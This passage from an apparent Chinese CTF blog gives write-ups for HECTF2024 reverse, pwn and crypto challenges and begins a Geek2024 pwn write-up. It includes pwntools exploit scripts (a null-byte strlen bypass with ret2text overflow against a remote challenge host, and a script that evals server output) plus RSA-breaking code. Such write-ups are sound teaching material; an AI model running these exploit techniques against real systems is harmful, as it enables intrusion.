class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs python">a=[<span class="hljs-number">0x58</span>, <span class="hljs-number">0x12</span>, <span class="hljs-number">0x1A</span>,<br><span class="hljs-number">0x0C</span>, <span class="hljs-number">0x1B</span>,<br><span class="hljs-number">0x5E</span>, <span class="hljs-number">0x58</span>, <span class="hljs-number">0x40</span>,<br><span class="hljs-number">0x46</span>, <span class="hljs-number">0x06</span>,<br><span class="hljs-number">0x0A</span>, <span class="hljs-number">0x26</span>, <span class="hljs-number">0x44</span>,<br><span class="hljs-number">0x0C</span>, <span class="hljs-number">0x56</span>,<br><span class="hljs-number">0x48</span>]<br>b5040=[<span class="hljs-number">0x15</span>, <span class="hljs-number">0x10</span>, <span class="hljs-number">0x48</span>,<br>  <span class="hljs-number">0x06</span>, <span class="hljs-number">0x19</span>, <br>  <span class="hljs-number">0x42</span>, <span class="hljs-number">0x6D</span>, <span class="hljs-number">0x18</span>, <br>  <span class="hljs-number">0x12</span>, <span class="hljs-number">0x0F</span>, <br>  <span class="hljs-number">0x27</span>, <span class="hljs-number">0x2F</span>, <span class="hljs-number">0x33</span>, <br>  <span class="hljs-number">0x1B</span>, <span class="hljs-number">0x50</span>, <br>  <span class="hljs-number">0x41</span>]<br><br>key=<span class="hljs-string">&#x27;hectf2024&#x27;</span><br>flag1=<span class="hljs-string">&#x27;&#x27;</span><br>flag2=<span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(a)):<br>    a[i]+=<span class="hljs-number">1</span><br>    flag1+=<span class="hljs-built_in">hex</span>(<span class="hljs-built_in">ord</span>(key[i%<span class="hljs-built_in">len</span>(key)])^a[i])+<span class="hljs-string">&#x27;,&#x27;</span><br><span class="hljs-built_in">print</span>(flag1)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(b5040)):<br>    b5040[i]+=<span class="hljs-number">2</span><br>    b5040[i]^=<span class="hljs-number">0x18</span><br>    flag2+=<span class="hljs-built_in">hex</span>(<span class="hljs-built_in">ord</span>(key[i%<span class="hljs-built_in">len</span>(key)])^b5040[i])+<span class="hljs-string">&#x27;,&#x27;</span><br><span class="hljs-built_in">print</span>(flag2)<br></code></pre></td></tr></table></figure><img src="/2024/12/12/HECTF2024/1733574131704-03dc1e0a-3c26-470f-9729-8dcc48782061.png" class="" title="img"><p>去除最后一个结束符然后md5</p><img src="/2024/12/12/HECTF2024/1733574157183-a4496e24-151f-47a7-83f2-19f905f8595b.png" class="" title="img"><h2 id="easyreee"><a href="#easyreee" class="headerlink" title="easyreee"></a>easyreee</h2><img src="/2024/12/12/HECTF2024/1733619671760-f1396e65-fff2-4c64-b7c0-f24847689d8d.png" class="" title="img"><img src="/2024/12/12/HECTF2024/1733619816739-e141e599-cc49-4fda-babc-c3d383f6c317.png" class="" title="img"><img src="/2024/12/12/HECTF2024/1733619807396-770022a3-5631-4531-8b1b-3808aca60161.png" class="" title="img"><img src="/2024/12/12/HECTF2024/1733621177457-52cbc597-8950-44e1-8c9c-858ae1e5e1b3.png" class="" title="img"><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs python">mi=[<span class="hljs-number">0x23</span>, <span class="hljs-number">0x21</span>, <span class="hljs-number">0x20</span>,<br> <span class="hljs-number">0x28</span>, <span class="hljs-number">0x25</span>,<br><span class="hljs-number">0x7E</span>, <span class="hljs-number">0x28</span>, <span class="hljs-number">0x46</span>,<br> <span class="hljs-number">0x52</span>, <span class="hljs-number">0x04</span>,<br><span class="hljs-number">0x4B</span>, <span class="hljs-number">0x52</span>, <span class="hljs-number">0x4C</span>,<br> <span class="hljs-number">0x03</span>, <span class="hljs-number">0x52</span>,<br><span class="hljs-number">0x04</span>, <span class="hljs-number">0x48</span>, <span class="hljs-number">0x4F</span>,<br> <span class="hljs-number">0x7B</span>, <span class="hljs-number">0x4F</span>,<br><span class="hljs-number">0x7D</span>, <span class="hljs-number">0x42</span>, <span class="hljs-number">0x44</span>,<br> <span class="hljs-number">0x04</span>, <span class="hljs-number">0x4F</span>,<br><span class="hljs-number">0x49</span>, <span class="hljs-number">0x70</span>]<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">len</span>(mi))<br><span class="hljs-comment"># a=[0]*2</span><br><span class="hljs-comment"># for k in range(0,255):</span><br><span class="hljs-comment">#     for i in range(0,2):</span><br><span class="hljs-comment">#         a[i]=(mi[i]^k)+21</span><br><span class="hljs-comment">#     shift=8</span><br><span class="hljs-comment">#     for i in range(2):</span><br><span class="hljs-comment">#         if a[i]&lt;=64 or a[i] &gt;=90:</span><br><span class="hljs-comment">#             if a[i]&gt;96 and a[i]&lt;=122:</span><br><span class="hljs-comment">#                 a[i]=(a[i]-97-shift)%26+97</span><br><span class="hljs-comment">#                 shift+=1</span><br><span class="hljs-comment">#         else:</span><br><span class="hljs-comment">#             a[i] = (a[i] - 65 - shift) % 26 + 65</span><br><span class="hljs-comment">#             shift += 1</span><br><span class="hljs-comment">#     if a[0]==ord(&#x27;H&#x27;) and a[1]==ord(&#x27;E&#x27;):</span><br><span class="hljs-comment">#         print(k)</span><br><span class="hljs-comment"># k=24</span><br>shift=<span class="hljs-number">8</span><br>flag=<span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(mi)):<br>    mi[i]=(mi[i]^<span class="hljs-number">0x18</span>)+<span class="hljs-number">21</span><br>    <span class="hljs-keyword">if</span> mi[i]&lt;=<span class="hljs-number">64</span> <span class="hljs-keyword">or</span> mi[i] &gt;=<span class="hljs-number">90</span>:<br>        <span class="hljs-keyword">if</span> mi[i]&gt;<span class="hljs-number">96</span> <span class="hljs-keyword">and</span> mi[i]&lt;=<span class="hljs-number">122</span>:<br>            mi[i]=(mi[i]-<span class="hljs-number">97</span>-shift)%<span class="hljs-number">26</span>+<span class="hljs-number">97</span><br>            shift+=<span class="hljs-number">1</span><br>    <span class="hljs-keyword">else</span>:<br>        mi[i] = (mi[i] - <span class="hljs-number">65</span> - shift) % <span class="hljs-number">26</span> + <span class="hljs-number">65</span><br>        shift += <span class="hljs-number">1</span><br>    flag+=<span class="hljs-built_in">chr</span>(mi[i])<br><span class="hljs-built_in">print</span>(flag)<br><span class="hljs-comment">#HECTF&#123;Re_1s_s0_1nterest1ng&#125;</span><br></code></pre></td></tr></table></figure><h1 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h1><h2 id="signin"><a href="#signin" class="headerlink" title="signin"></a>signin</h2><img src="/2024/12/12/HECTF2024/1733535381246-f1d2043f-180a-4c37-94e4-834b8967b61f.png" class="" title="img"><p>用\x00绕过strlen，然后ret2text</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>filename=<span class="hljs-string">&#x27;./pwn&#x27;</span><br>elf = ELF(filename)<br><span class="hljs-comment">#libc = ELF(&quot;./libc.so.6&quot;)</span><br>context(arch = elf.arch,log_level = <span class="hljs-string">&#x27;debug&#x27;</span>,os = <span class="hljs-string">&#x27;linux&#x27;</span>)<br><br>debug = <span class="hljs-number">0</span><br><span class="hljs-keyword">if</span> debug:<br>io = process(filename)<br><span class="hljs-keyword">else</span>:<br>    io = remote(<span class="hljs-string">&#x27;8.153.107.216&#x27;</span>,<span class="hljs-number">30418</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">s</span>(<span class="hljs-params">a</span>) : io.send(a)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">sa</span>(<span class="hljs-params">a, b</span>) : io.sendafter(a, b)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">sl</span>(<span class="hljs-params">a</span>) : io.sendline(a)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">sla</span>(<span class="hljs-params">a, b</span>) : io.sendlineafter(a, b)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">r</span>() : <span class="hljs-keyword">return</span> io.recv()<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">pr</span>() : <span class="hljs-built_in">print</span>(io.recv())<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">ru</span>(<span class="hljs-params">a</span>) : <span class="hljs-keyword">return</span> io.recvuntil(a)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">inter</span>() : io.interactive()<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>():<br>    gdb.attach(io)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">b</span>(<span class="hljs-params">addr</span>):<br>    <span class="hljs-comment">#bk=&quot;b *$rebase(&quot;+str(addr)+&quot;)&quot;</span><br>    bk=<span class="hljs-string">&#x27;b *&#x27;</span> + <span class="hljs-built_in">str</span>(addr)<br>    attach(io,bk)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_addr</span>():<br><span class="hljs-keyword">return</span> u64(io.recvuntil(<span class="hljs-string">b&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>))<br><span class="hljs-comment">#return u32(io.recv()[0:4])</span><br><br><span class="hljs-keyword">from</span> struct <span class="hljs-keyword">import</span> pack<br><br><br>back=<span class="hljs-number">0x401285</span><br>payload=<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">7</span>+<span class="hljs-string">b&#x27;\x00&#x27;</span>+<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0xe</span>+p64(back)<br><span class="hljs-comment">#debug()</span><br>sla(<span class="hljs-string">&quot;please sign in!!!!&quot;</span>,payload)<br>sa(<span class="hljs-string">&quot;Enter your key&quot;</span>,<span class="hljs-string">b&#x27;HECTF2024q&#x27;</span>)<br>inter()<br></code></pre></td></tr></table></figure><h1 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h1><h2 id="艾米莉"><a href="#艾米莉" class="headerlink" title="艾米莉"></a>艾米莉</h2><p>维吉尼亚responsibility作为密钥+栅栏</p><img src="/2024/12/12/HECTF2024/1733536379814-586697e1-6f65-412c-ba47-5edef0af81aa.png" class="" title="img"><img src="/2024/12/12/HECTF2024/1733535523199-43bca65c-6210-433b-92cd-765e8cf3f11e.png" class="" title="img"><img src="/2024/12/12/HECTF2024/1733536353388-37d8a3b0-b729-4780-befb-4ec704778dfa.png" class="" title="img"><h2 id="seven-more"><a href="#seven-more" class="headerlink" title="seven_more"></a>seven_more</h2><p>phi是e的倍数</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">from</span> gmpy2 <span class="hljs-keyword">import</span> *<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">getMyPrime</span>(<span class="hljs-params">nbits, multiplier</span>):<br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        n = <span class="hljs-number">2</span> * multiplier * getPrime(nbits // <span class="hljs-number">2</span>) * getPrime(nbits // <span class="hljs-number">2</span>)<br>        <span class="hljs-keyword">if</span> is_prime(n + <span class="hljs-number">1</span>):<br>            <span class="hljs-keyword">return</span> n + <span class="hljs-number">1</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">generate_keys</span>(<span class="hljs-params">nbits</span>):<br>    p = getMyPrime(nbits, <span class="hljs-number">1009</span> * <span class="hljs-number">7</span>)<br>    q = getMyPrime(nbits, <span class="hljs-number">1009</span>)<br>    n = p * q<br>    e = <span class="hljs-number">1009</span> * <span class="hljs-number">7</span><br>    <span class="hljs-keyword">return</span> p, q, n, e<br><br>p, q, n, e = generate_keys(<span class="hljs-number">700</span>)<br><br>flag = <span class="hljs-string">b&#x27;HECTF&#123;######&#125;&#x27;</span> + os.urandom(<span class="hljs-number">101</span>)<br>m = bytes_to_long(flag)<br><span class="hljs-keyword">assert</span> m.bit_length() &lt; n.bit_length()<br><span class="hljs-keyword">assert</span> m.bit_length() &gt; q.bit_length()<br><span class="hljs-keyword">assert</span> m.bit_length() &gt; p.bit_length()<br>c = <span class="hljs-built_in">pow</span>(m, e, n)<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;n = <span class="hljs-subst">&#123;n&#125;</span>&quot;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;c = <span class="hljs-subst">&#123;c&#125;</span>&quot;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;p = <span class="hljs-subst">&#123;p&#125;</span>&quot;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;q = <span class="hljs-subst">&#123;q&#125;</span>&quot;</span>)<br><br><span class="hljs-comment">#n = 211174039496861685759253930135194075344490160159278597570478160714793843648384778026214533259531963057737358092962077790023796805017455012885781079402008604439036453706912819711606916173828620000813663524065796636039272173716362247511054616756763830945978879273812551204996912252317081836281439680223663883250992957309172746671265758427396929152878633033380299036765665530677963287445843653357154379447802151146728382517702550201</span><br><span class="hljs-comment">#c = 191928992610587693825282781627928404831411364407297375816921425636703444790996279718679090695773598752804431891678976685083991392082287393228730341768083530729456781668626228660243400914135691435374881498580469432290771039798758412160073826112909167507868640830965603769520664582121780979767127925146139051005022993085473836213944491149411881673257628267851773377966008999511673741955131386600993547529438576918914852633139878066</span><br><span class="hljs-comment">#p = 31160882390461311665815471693453819123352546432384109928704874241292707178454748381602275005604671000436222741183159072136366212086549437801626015758789167455043851748560416003501637268653712148286072544482747238223</span><br><span class="hljs-comment">#q = 6776895366785389188349778634427547683984792095011326393872759455291221057085426285502176493658280343252730331506803173791893339840460125807960788857396637337440004750209164671124188980183308151635629356496128717687</span><br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br>n = <span class="hljs-number">211174039496861685759253930135194075344490160159278597570478160714793843648384778026214533259531963057737358092962077790023796805017455012885781079402008604439036453706912819711606916173828620000813663524065796636039272173716362247511054616756763830945978879273812551204996912252317081836281439680223663883250992957309172746671265758427396929152878633033380299036765665530677963287445843653357154379447802151146728382517702550201</span><br>c = <span class="hljs-number">191928992610587693825282781627928404831411364407297375816921425636703444790996279718679090695773598752804431891678976685083991392082287393228730341768083530729456781668626228660243400914135691435374881498580469432290771039798758412160073826112909167507868640830965603769520664582121780979767127925146139051005022993085473836213944491149411881673257628267851773377966008999511673741955131386600993547529438576918914852633139878066</span><br>p = <span class="hljs-number">31160882390461311665815471693453819123352546432384109928704874241292707178454748381602275005604671000436222741183159072136366212086549437801626015758789167455043851748560416003501637268653712148286072544482747238223</span><br>q = <span class="hljs-number">6776895366785389188349778634427547683984792095011326393872759455291221057085426285502176493658280343252730331506803173791893339840460125807960788857396637337440004750209164671124188980183308151635629356496128717687</span><br>e=<span class="hljs-number">1009</span>*<span class="hljs-number">7</span><br><br>P.&lt;a&gt; = PolynomialRing(Zmod(p),implementation=<span class="hljs-string">&#x27;NTL&#x27;</span>)<br>f = a^e - c<br>mps = f.monic().roots(multiplicities = <span class="hljs-literal">False</span>)<br><span class="hljs-built_in">print</span>(mps)<br><br>P.&lt;a&gt; = PolynomialRing(Zmod(q),implementation=<span class="hljs-string">&#x27;NTL&#x27;</span>)<br>f = a^e - c<br>mqs = f.monic().roots(multiplicities = <span class="hljs-literal">False</span>)<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> mps:<br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> mqs:<br>        m = crt([<span class="hljs-built_in">int</span>(i),<span class="hljs-built_in">int</span>(j)],[p,q])<br>        flag = long_to_bytes(m)<br>        <span class="hljs-keyword">if</span> <span class="hljs-string">b&#x27;HECTF&#x27;</span> <span class="hljs-keyword">in</span> flag:<br>            <span class="hljs-built_in">print</span>(flag)<br></code></pre></td></tr></table></figure><p>爆破大约半小时就能出</p><img src="/2024/12/12/HECTF2024/1733584094412-572102cc-7ac3-4337-b9c5-6498a4781aa9.png" class="" title="img"><h2 id="翻一翻"><a href="#翻一翻" class="headerlink" title="翻一翻"></a>翻一翻</h2><p>p是q的10进制翻转，找到文章</p><p><a href="https://kt.gy/blog/2015/10/asis-2015-finals-rsasr/">https://kt.gy/blog/2015/10/asis-2015-finals-rsasr/</a></p><p>先得到pq</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs python">n = <span class="hljs-number">404647938065363927581436797059920217726808592032894907516792959730610309231807721432452916075249512425255272010683662156287639951458857927130814934886426437345595825614662468173297926187946521587383884561536234303887166938763945988155320294755695229129209227291017751192918550531251138235455644646249817136993</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">t</span>(<span class="hljs-params">a, b, k</span>):<br><span class="hljs-comment"># sqrt(n) has 155 digits, so we need to figure out 77 digits on each side</span><br>    <span class="hljs-keyword">if</span> k == <span class="hljs-number">77</span>:<br>        <span class="hljs-keyword">if</span> a*b == n:<br>            <span class="hljs-built_in">print</span>(a, b)<br>        <span class="hljs-keyword">return</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">10</span>):<br>        <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">10</span>):<br><span class="hljs-comment"># we try to guess the last not-already-guessed digits of both primes</span><br>            a1 = a + i*(<span class="hljs-number">10</span>**k) + j*(<span class="hljs-number">10</span>**(<span class="hljs-number">154</span>-k))<br>            b1 = b + j*(<span class="hljs-number">10</span>**k) + i*(<span class="hljs-number">10</span>**(<span class="hljs-number">154</span>-k))<br>            <span class="hljs-keyword">if</span> a1*b1 &gt; n:<br><span class="hljs-comment"># a1 and b1 are too large</span><br>                <span class="hljs-keyword">continue</span><br>            <span class="hljs-keyword">if</span> (a1+(<span class="hljs-number">10</span>**(<span class="hljs-number">154</span>-k)))*(b1+(<span class="hljs-number">10</span>**(<span class="hljs-number">154</span>-k))) &lt; n:<br><span class="hljs-comment"># a1 and b1 are too small</span><br>                <span class="hljs-keyword">continue</span><br>            <span class="hljs-keyword">if</span> ((a1*b1)%(<span class="hljs-number">10</span>**(k+<span class="hljs-number">1</span>))) != (n%(<span class="hljs-number">10</span>**(k+<span class="hljs-number">1</span>))):<br><span class="hljs-comment"># The last digits of a1*b1 (which won&#x27;t change later) doesn&#x27;t match n</span><br>                <span class="hljs-keyword">continue</span><br><span class="hljs-comment"># this a1 and b1 seem to be a possible match, try to guess remaining digits</span><br>            t(a1, b1, k+<span class="hljs-number">1</span>)<br><br><span class="hljs-comment"># the primes have odd number of digits (155), so we try all possible middle digits (it simplifies the code)</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">10</span>):<br>    t(i*(<span class="hljs-number">10</span>**<span class="hljs-number">77</span>), i*(<span class="hljs-number">10</span>**<span class="hljs-number">77</span>), <span class="hljs-number">0</span>)<br></code></pre></td></tr></table></figure><p>后面标准rsa</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> base64<br>c = <span class="hljs-number">365683379886722889532600303686680978443674067781851827634350197114193449886360409198931986483197030101273917834823409997256928872225094802167525677723275059148476025160768252077264285289388640035034637732158021710365512158554924957332812612377993122491979204310133332259340515767896224408367368108253503373778</span><br><span class="hljs-comment"># p=39316409865082827891559777929907275271727781922450971403181273772573121561800306699150395758615464222134092274991810028405823897933152302724628919678029201</span><br><span class="hljs-comment"># q=10292087691982642720325133979832850482001819947229043122246451685759305199660300816512137527737218130417905422918772717257270992977795519872828056890461393</span><br>p=<span class="hljs-number">10292087691982642720325133979832850482001819947229043122246451685759305199660300816512137527737218130417905422918772717257270992977795519872828056890461393</span><br>q=<span class="hljs-number">39316409865082827891559777929907275271727781922450971403181273772573121561800306699150395758615464222134092274991810028405823897933152302724628919678029201</span><br>e = <span class="hljs-number">65537</span><br>phi = (p-<span class="hljs-number">1</span>)*(q-<span class="hljs-number">1</span>)<br>d = inverse(e, phi)<br>m = <span class="hljs-built_in">pow</span>(c, d, p*q)<br>a=long_to_bytes(m)<br><span class="hljs-built_in">print</span>(base64.b64decode(a))<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>比赛wp</category>
      
    </categories>
    
    
    <tags>
      
      <tag>app逆向</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Geek2024部分Reverse与Pwn</title>
    <link href="/2024/11/24/Geek2024%E9%83%A8%E5%88%86Reverse%E4%B8%8EPwn/"/>
    <url>/2024/11/24/Geek2024%E9%83%A8%E5%88%86Reverse%E4%B8%8EPwn/</url>
    
    <content type="html"><![CDATA[<h1 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h1><h2 id="签到"><a href="#签到" class="headerlink" title="签到"></a>签到</h2><p>限制1秒输入，那就自动实现</p><img src="/2024/11/24/Geek2024%E9%83%A8%E5%88%86Reverse%E4%B8%8EPwn/1731503838552-e81e0d11-85a5-48b1-9ec6-bdedc964cc2c.png" class="" title="img"><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> struct <span class="hljs-keyword">import</span> pack<br><span class="hljs-keyword">from</span> ctypes <span class="hljs-keyword">import</span> *<br><br><br>debug = <span class="hljs-number">1</span><br><span class="hljs-keyword">if</span> debug:<br>    io = process(filename)<br><span class="hljs-keyword">else</span>:<br>io = remote(<span class="hljs-string">&#x27;nc1.ctfplus.cn&#x27;</span>,<span class="hljs-number">12304</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">s</span>(<span class="hljs-params">a</span>) : io.send(a)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">sa</span>(<span class="hljs-params">a, b</span>) : io.sendafter(a, b)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">sl</span>(<span class="hljs-params">a</span>) : io.sendline(a)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">sla</span>(<span class="hljs-params">a, b</span>) : io.sendlineafter(a, b)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">r</span>() : <span class="hljs-keyword">return</span> io.recv()<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">pr</span>() : <span class="hljs-built_in">print</span>(io.recv())<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">ru</span>(<span class="hljs-params">a</span>) : <span class="hljs-keyword">return</span> io.recvuntil(a)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">inter</span>() : io.interactive()<br> <br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_addr</span>():<br><span class="hljs-keyword">return</span> u64(io.recvuntil(<span class="hljs-string">b&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>))<br><span class="hljs-comment">#return u32(io.recv()[0:4])</span><br><br>ru(<span class="hljs-string">&quot;challenge.&quot;</span>)<br>s(<span class="hljs-string">&#x27;\n&#x27;</span>)<br>s=io.recvuntil(<span class="hljs-string">&quot; = &quot;</span>, drop=<span class="hljs-literal">True</span>)<br><span class="hljs-comment">#print(s)</span><br>s1=<span class="hljs-built_in">eval</span>(s)<br><span class="hljs-comment">#print(s1)</span><br>sl(<span class="hljs-built_in">str</span>(s1).encode())<br>inter()<br></code></pre></td></tr></table></figure><h2 id="stackover"><a href="#stackover" class="headerlink" title="stackover"></a>stackover</h2><p>栈溢出后跳到system，不能直接跳到key，因为key一开始会销毁栈，导致NX</p><img src="/2024/11/24/Geek2024%E9%83%A8%E5%88%86Reverse%E4%B8%8EPwn/1731734024192-79c0f250-cc97-44e5-92da-58889ac9d596.png" class="" title="img"><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span 